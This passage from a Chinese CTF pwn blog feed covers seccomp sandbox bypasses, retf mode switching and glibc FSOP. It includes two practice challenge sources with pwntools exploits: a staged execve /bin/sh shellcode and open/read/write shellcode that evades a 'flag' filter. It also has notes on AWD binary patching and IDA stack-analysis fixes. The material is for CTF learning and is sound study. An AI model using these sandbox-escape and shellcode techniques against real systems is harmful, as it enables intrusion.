调用openat，然后除了 read，write，其实还有两个</p><p>readv，和writev，这些就能绕过限制读取flag,有些连openat都禁用的可以 ptrace 修改syscall</p><h3 id="3—禁用execve-控制open-write-read的参数"><a href="#3—禁用execve-控制open-write-read的参数" class="headerlink" title="3—禁用execve,控制open,write,read的参数"></a>3—禁用execve,控制open,write,read的参数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0b</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x08</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x06</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != read) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000014</span>  A = fd &gt;&gt; <span class="number">32</span> <span class="meta"># read(fd, buf, count)</span></span><br><span class="line"><span class="number">0008</span>: <span class="number">0x25</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A &gt; <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0012</span></span><br><span class="line"><span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x03</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"><span class="number">0010</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  A = fd <span class="meta"># read(fd, buf, count)</span></span><br><span class="line"><span class="number">0011</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000004</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x4</span>) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"><span class="number">0012</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0013</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>限制参数的,可以在参数上找关键点</p><h3 id="4—限制sys-number"><a href="#4—限制sys-number" class="headerlink" title="4—限制sys_number"></a>4—限制sys_number</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x07</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000065</span>  <span class="keyword">if</span> (A == ptrace) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000101</span>  <span class="keyword">if</span> (A == openat) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000130</span>  <span class="keyword">if</span> (A == open_by_handle_at) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0009</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>没有判断<code>if (A &lt; 0x40000000)</code></p><p>导致了可以 0x40000000+sys_number绕过，sys_number |= 0x40000000</p><p>同样如果没有判断<code>if(A != ARCH_X86_64)</code></p><p>这个可以同32位的shellcode绕过过</p><h2 id="通过切换模式来绕过PWN题中对系统调用的拦截"><a href="#通过切换模式来绕过PWN题中对系统调用的拦截" class="headerlink" title="通过切换模式来绕过PWN题中对系统调用的拦截"></a>通过切换模式来绕过PWN题中对系统调用的拦截</h2><p><strong>retf</strong>是一条远转移指令，等价于pop cs; pop ip，这条指令一般来说可以在libc中找到，但为什么它能修改程序的模式呢，实际上是因为它修改了cs段寄存器。</p><p><strong>cs寄存器</strong>即code segment寄存器，指向存放代码的内存段，在8086的实模式下，指令的寻址为cs:ip-&gt;cs *16 + ip。在32位保护模式下，cpu地址总线和通用寄存器都达到了32位，可以直接访问4GB的内存，段寄存器被赋予了新的任务：保存段描述符的索引即段选择符(segment descriptor)</p><pre><code>                +--------------------------------------+                |         index                 |T|    |                |                               |I|RPL |                +--------------------------------^--^--+                                                 |  |                   Table indicator+--------------+  |                     0 GDT                          |                     1 LDT                          |                  Request Privilege Level+----------+                    </code></pre><p>段选择符的低两位用来表示特权级0-3，第3位表示对应的描述符是位于GDT or LDT，高15位则是下标。在段描述符里，保存有更多的该段的参数信息，包括段基址、粒度、属性、模式等等，</p><p>以64为模式切换到32位模式为例，为了实现模式的切换，我们需要找到一个合适的段选择符，它指向GDT中的一个32位的段描述符。</p><p>在linux x86_x64中，<strong>0x23是一个32位的代码段选择符</strong>（位于GDT），<strong>0x33是一个64位长模式的代码段选择符</strong>。所以在模式切换时，只需用retf指令将cs寄存器的值由0x33改为0x23即可。</p><p>另外需要注意的是，由于程序从64位切换到了32位，<strong>所以各个通用寄存器的使用发生了变化，从原来的8字节变成了只使用低4字节</strong>，特别对于栈寄存器<strong>esp</strong>来说，它是rsp的低4字节，原先的rsp保存着可以被正常访问的栈地址，但这个地址的低4字节大概率为一个不可访问的地址，<strong>所以在执行retf之前，还需要进行栈迁移</strong>，只要通过rop控制rbp后进行两次连续的leave指令就可以实现。</p><p>在Linux中，除了FS、GS需要设置段基址用于访问TLS之外，其余的段寄存器对应的段描述符中的段基址都被置为了0，也就是直接使用偏移作为内存访问的绝对地址，所以只要控制好指令指针寄存器，模式切换时就不会出现控制流的失控。</p><h1 id="任务Ⅲ—-unsorted相关"><a href="#任务Ⅲ—-unsorted相关" class="headerlink" title="任务Ⅲ—-unsorted相关"></a>任务Ⅲ—-unsorted相关</h1><h2 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h2><p>glibc2.23下,unsortedbin的利用主要与fsop结合在一起</p><p>利用unsortedbin attack往IO_list_all中写入main_arena+0x58</p><p>由于_chain字段在_IO_FILE中的偏移是0x68</p><p>那么就会将真实大小为0x60chunk的bk字段视为_chain字段,故该bk需指向fake_IO_FILE</p><p>所以fake_IO_FILE需要被加入0x60的smallbin中,并确保是最后一个chunk</p><p>一般是触发从unsortedbin往外取出,放入smallbin后,继续取出(IO_list_all-0x10)但因为大小不通过检测,触发malloc_printer,以此getshell</p><p>IO_list_all-0x10视为chunk的话size字段是空的(固定内存)</p><h1 id="任务Ⅳ—-出题"><a href="#任务Ⅳ—-出题" class="headerlink" title="任务Ⅳ—-出题"></a>任务Ⅳ—-出题</h1><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc shellcode.c -o shellcode -no-pie</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input shellcode!&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,shellcode,<span class="number">18</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(shellcode)==<span class="number">2</span>)</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))shellcode)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只能读取18个字节的shellcode小于最短的shellcode</p><p>同时shellcode长度只能为2,通过jmp绕过</p><p>构造二次read读入到刚好执行到的位置</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p= process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line">payload =<span class="string">b&#x27;\xEB\xFF\x00\x31\xFF\x48\xC7\xC6\x72\x40\x40\x00\xB2\x40\x31\xC0\x0F\x05&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;shellcode!&#x27;</span>,payload)</span><br><span class="line">p.send(<span class="string">b&#x27;\x48\x31\xF6\x56\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x54\x5F\xB0\x3B\x99\x0F\x05&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="sandbox"><a href="#sandbox" class="headerlink" title="sandbox"></a>sandbox</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g sandbox.c -o sandbox -lseccomp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">sandbox</span><span class="params">()</span> &#123;</span><br><span class="line">scmp_filter_ctx ctx;</span><br><span class="line">ctx = seccomp_init(SCMP_ACT_KILL);</span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_ALLOW, __NR_open, <span class="number">0</span>);</span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_ALLOW, __NR_read, <span class="number">0</span>);</span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_ALLOW, __NR_write, <span class="number">0</span>);</span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_ALLOW, __NR_exit, <span class="number">0</span>);</span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_ALLOW, __NR_exit_group, <span class="number">0</span>);</span><br><span class="line">seccomp_load(ctx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">removeflag</span><span class="params">(<span class="type">char</span> *str, <span class="type">const</span> <span class="type">char</span> *sub)</span> &#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(sub);</span><br><span class="line">    <span class="keyword">if</span> (len == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *p = str;</span><br><span class="line">    <span class="keyword">while</span> ((p = <span class="built_in">strstr</span>(p, sub)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        memmove(p, p + len, <span class="built_in">strlen</span>(p + len) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> *sub = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">    sandbox();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello!&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,shellcode,<span class="number">0x100</span>);</span><br><span class="line">    removeflag(shellcode,sub);</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))shellcode)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只是在开启沙盒后过滤了一次’flag’字符串,绕过即可</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p= process(<span class="string">&#x27;./sandbox&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push 0x0</span></span><br><span class="line"><span class="string">push 0x67616c67</span></span><br><span class="line"><span class="string">push 0x616c6666</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">mov eax,5</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov ebx,eax</span></span><br><span class="line"><span class="string">mov ecx,esp</span></span><br><span class="line"><span class="string">mov edx,0x64</span></span><br><span class="line"><span class="string">mov eax,3</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">mov ebx,1</span></span><br><span class="line"><span class="string">mov ecx,esp</span></span><br><span class="line"><span class="string">mov edx,0x64</span></span><br><span class="line"><span class="string">mov eax,4</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;Hello!&#x27;</span>,asm(payload))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">week-1</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://ixout.github.io/tags/pwn/"/>
    
    <category term="SunmerCamp2023" scheme="https://ixout.github.io/tags/SunmerCamp2023/"/>
    
  </entry>
  
  <entry>
    <title>awd-awdp笔记</title>
    <link href="https://ixout.github.io/posts/32516/"/>
    <id>https://ixout.github.io/posts/32516/</id>
    <published>2023-07-01T08:24:20.000Z</published>
    <updated>2023-07-30T11:42:59.507Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于awd-amp-awdp"><a href="#关于awd-amp-awdp" class="headerlink" title="关于awd&amp;awdp"></a>关于awd&amp;awdp</h1><p>目前只参加过一场awdp,想过去二者差距应该不会太大</p><p>其各自又分为check和attack,后者就是平常的做题</p><p>而要想快速高效的得分主要是靠check</p><p>不同比赛check机制可能会有些许不同,但有一些较为通用的方式</p><h1 id="0x1通防-seccomp"><a href="#0x1通防-seccomp" class="headerlink" title="0x1通防-seccomp"></a>0x1通防-seccomp</h1><p>总体思路是在不影响程序本身运行的前提下手动给程序禁用一些系统调用</p><p>推荐工具 <strong>↓</strong></p><h2 id="evilPatcher"><a href="#evilPatcher" class="headerlink" title="evilPatcher"></a>evilPatcher</h2><p>其是一个python2脚本</p><p>特点:</p><ul><li>修改的字节数少，0x100字节以下</li><li>不修改文件头信息</li><li>沙箱规则可以自己定义</li><li>支持i386和amd64</li><li>支持pie开启和未开启情况</li></ul><p><strong>其sandboxs文件夹中存储沙盒规则</strong></p><p>用法</p><p><code>python2 evilPatcher.py elfFile sandboxFile-path</code></p><p><code>python2 evilPatcher.py elfFile sandboxFile-path 1</code>会有详细中间过程</p><p>已自动识别32位和64位与pie</p><p> 结果输出一个patch过后的文件，文件名为原来文件加上.patch后缀</p><p><a href="https://github.com/TTY-flag/evilPatcher">github项目地址</a></p><h1 id="0x2LIEF"><a href="#0x2LIEF" class="headerlink" title="0x2LIEF"></a>0x2LIEF</h1><p><code>LIEF</code>是一个能够用于对各种类型的可执行文件（包括Linux ELF文件、Windows exe文件、Android Dex文件等）进行转换、提取、修改的项目，能够在Python、C++和C语言中调用其API进行简单便捷的可执行文件相关操作。</p><p>当不能简单地通过在IDA中修改指令的方式patch时，就需要使用LIEF工具完成patch。</p><p>一般使用其python包</p><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="程序加载重建"><a href="#程序加载重建" class="headerlink" title="程序加载重建"></a>程序加载重建</h3><p>调用lief.ELF.parse() 函数加载一个可执行文件。如果输入的文件为ELF文件，则返回一个lief.ELF.Binary对象。</p><p>例<code>binary=lief.ELF.parse(&#39;./elf&#39;)</code></p><p>重建这个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binary.write(&quot;elf.modified&quot;)</span><br></pre></td></tr></table></figure><h3 id="header字段"><a href="#header字段" class="headerlink" title="header字段"></a>header字段</h3><p>elf的header字段保存有该ELF文件的一些相关信息，</p><p>包括程序的入口地址（binary.header.entrypoint）、程序运行的机器类型（binary.header.machine_type），</p><p>这两个值都是可以直接修改的</p><p>通过对lief项目的python源码进行查看可知header中还保存有以下较为重要的ELF文件的属性</p><p><strong>完整在lief/ELF/Header.py中查看</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file_type：文件类型，表示该文件是一个可执行文件还是库文件还是其他文件。</span><br><span class="line">header_size：ELF文件头部的长度。</span><br><span class="line">identity：ELF的前几个字节的值，用于标识ELF类型。</span><br><span class="line">identity_class：ELF程序的类型。</span><br><span class="line">identity_data：数据表示方式（大端序或小端序）</span><br><span class="line">numberof_sections：section（节）的数量</span><br><span class="line">numberof_segments：segment（段）的数量（一个segment中包含至少一个section）</span><br></pre></td></tr></table></figure><h3 id="其他字段"><a href="#其他字段" class="headerlink" title="其他字段"></a>其他字段</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">dtor_functions：析构函数列表。</span><br><span class="line">functions：函数列表。</span><br><span class="line">imagebase：ELF文件的加载基地址，在64位程序下，不开启PIE时Image Base=0x401000，开启后在程序开始执行前动态加载，地址不定。</span><br><span class="line">is_pie：是否开启了PIE。</span><br><span class="line">sections：节列表，迭代器。</span><br><span class="line">segments：段列表，迭代器。</span><br><span class="line">static_symbols：静态符号列表，迭代器。</span><br><span class="line">strings：字符串列表，迭代器。</span><br><span class="line">symbols：所有符号的列表，迭代器。</span><br><span class="line">imported_functions：导入函数列表，即got表中的函数列表。</span><br></pre></td></tr></table></figure><p>可以直接binary.is_pie这样调用</p><h3 id="修改ELF的symbols"><a href="#修改ELF的symbols" class="headerlink" title="修改ELF的symbols"></a>修改ELF的symbols</h3><h3 id="ELF-Hooking"><a href="#ELF-Hooking" class="headerlink" title="ELF Hooking"></a>ELF Hooking</h3><h3 id="修改got表"><a href="#修改got表" class="headerlink" title="修改got表"></a>修改got表</h3><h1 id="0x3-angr"><a href="#0x3-angr" class="headerlink" title="0x3 angr"></a>0x3 angr</h1>]]></content>
    
    
    <summary type="html">关于awd与awdp的一些笔记</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="awdp" scheme="https://ixout.github.io/tags/awdp/"/>
    
    <category term="awd" scheme="https://ixout.github.io/tags/awd/"/>
    
  </entry>
  
  <entry>
    <title>ida伪代码生成失败应对</title>
    <link href="https://ixout.github.io/posts/35200/"/>
    <id>https://ixout.github.io/posts/35200/</id>
    <published>2023-06-26T07:08:17.000Z</published>
    <updated>2023-06-27T13:34:11.540Z</updated>
    
    <content type="html"><![CDATA[<span class='p red h3'>基本都是堆栈不平衡引起的</span><p>在IDA Pro中,如果返回之前没有清理堆栈分配(平衡堆栈指针)，则反编译器将拒绝反编译该函数.</p><p>参考<a href="https://www.freebuf.com/sectool/156625.html">慎点！来自反编译器的危险 - FreeBuf网络安全行业门户</a></p><h1 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h1><h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><p>程序存在一些故意干扰指令</p><p>比如用push(call 本函数内部) + n条指令 + <strong>retn</strong>来实际跳转，而IDA会将这个<strong>retn</strong>认为是整个函数结束</p><p>结果分析后发现调用栈不平衡，因此就提示sp analysis failed.</p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>分析干扰指令,并优化</p><h2 id="例"><a href="#例" class="headerlink" title="例"></a>例</h2><p><strong>2023ciscn华东南—colorful</strong></p><p>直接反编译main</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-06-26_162711.png" alt=""></p><p><strong>提示我们问题出在1d87处</strong></p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-06-26_162837.png" alt=""></p><p>标黄的retn被认为是main的结束,但显然不是,因此栈不平衡</p><p>且retn上面的部分都是干扰指令</p><p>那么就要想办法优化这部分指令</p><p>先分析干扰指令</p><ol><li>call loc_1D8F:push rip<strong>(1D8C)</strong>,jmp loc_1D8F</li><li>pop rax:将rax变为1D8C,再跳转</li><li>inc rax:rax加1,成为1D8D,再跳转</li><li>push rax; retn:将rax压入栈,并以此为返回地址</li><li>1D8D处的指令为E8 0D,即<u><strong>jmp 1d8d+D(1d9c)</strong></u></li></ol><p>可以看到这部分代码没有实现任何功能,完全就是干扰</p><p>完全可以优化</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-06-26_164306.png" alt=""></p><p><strong>在1d87处直接跳转到1d9c,其余代码全部nop</strong></p><p>之后即可得到伪代码</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>发现干扰指令并优化,去除提前出现的retn等会让ida误解的指令</p><h1 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h1><h2 id="解决-1"><a href="#解决-1" class="headerlink" title="解决"></a>解决</h2><p>修正sp值</p><p>保持call或jmp等跳转指令前后栈平衡</p><p>call或jmp等跳转指令前的sp是多少,那么紧接在该指令后的sp也修改为多少</p><h1 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h1><h2 id="解决-2"><a href="#解决-2" class="headerlink" title="解决"></a>解决</h2><p>选中红色代码部分,快捷键p创建函数,该部分即可得到伪代码</p><p>但前面的部分依然不行</p><p>再调整函数开始的sp尝试</p><h1 id="0x4"><a href="#0x4" class="headerlink" title="0x4"></a>0x4</h1><h2 id="成因-1"><a href="#成因-1" class="headerlink" title="成因"></a>成因</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">one_function</span><span class="params">( <span class="type">int</span> a,<span class="type">int</span> b)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">another_function</span><span class="params">( <span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ( a == <span class="number">0</span> || b == <span class="number">0</span> )</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">return</span> one_function(a,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中return one_function(a,b)这条语句，在某些新的编译器，可能会编译成这样的指令序列：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov esp, ebp</span><br><span class="line">pop ebp</span><br><span class="line">jmp one_funcion</span><br></pre></td></tr></table></figure><p>而IDA是通过retn指令来识别函数的结束的，因为它不知道这里的意思，会把它当成一个函数内部 的跳转，最后就会出现sp analysis failed了。</p><h2 id="解决-3"><a href="#解决-3" class="headerlink" title="解决"></a>解决</h2><p>调整指令</p>]]></content>
    
    
    <summary type="html">sp-analysis failed!!!</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://ixout.github.io/tags/pwn/"/>
    
    <category term="ida" scheme="https://ixout.github.io/tags/ida/"/>
    
  </entry>
  
  <entry>
    <title>2023ciscn华东南赛区</title>
    <link href="https://ixout.github.io/posts/4654/"/>
